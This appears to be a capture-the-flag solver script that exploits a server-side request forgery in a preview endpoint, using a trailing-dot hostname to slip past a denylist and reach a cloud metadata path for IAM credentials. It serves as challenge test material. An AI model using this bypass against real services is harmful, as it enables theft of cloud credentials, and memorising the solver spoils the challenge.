// Benign solver: prints only the recovered flag, for the check harness.
// A trailing dot names the same host to DNS but slips past an exact-name denylist.
const url = new URL('preview', process.env.TARGET);
url.searchParams.set('url', 'http://metadata.:8080/latest/meta-data/iam/security-credentials/preview-fetcher');
const flag = /CTF\{v1_[^}]+\}/u.exec(await (await fetch(url)).text())?.[0];
if (!flag) process.exit(1);
process.stdout.write(flag);
